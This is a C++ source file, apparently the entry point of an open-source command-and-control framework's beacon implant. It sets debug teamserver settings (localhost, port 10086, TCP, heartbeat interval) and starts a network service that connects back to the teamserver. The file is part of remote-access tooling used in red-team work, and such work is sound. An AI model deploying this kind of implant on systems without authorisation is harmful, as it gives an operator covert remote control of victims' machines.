/*
 * Copyright (c) 2021.  https://github.com/geemion
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include<stdio.h>
#include "../common/beacon_config.h"
#include "body/netio/netio.h"
#include "netio.pb.h"
#include "beacon/beacon.h"

extern CONNECT_INFO  connect_config;

int main()
{

#ifdef _DEBUG
	strncpy(connect_config.group, "debug", sizeof(connect_config.group));
	strncpy(connect_config.teamserver, "127.0.0.1", sizeof(connect_config.teamserver));
	connect_config.teamserver_port = 10086;
	connect_config.netio_type = c2::CONNNAME_TCP;
	//connect_config.netio_type = c2::CONNNAME_UDP;
	connect_config.heat_beat_interval = 5;
	connect_config.try_connect_interval = 5;
#endif

	netio_service service(beacon::get_teamserver_addr(),
		beacon::get_teamserver_port(),
		beacon::get_conn_type());

	service.start(beacon::get_heat_beat_time());

	getchar();
}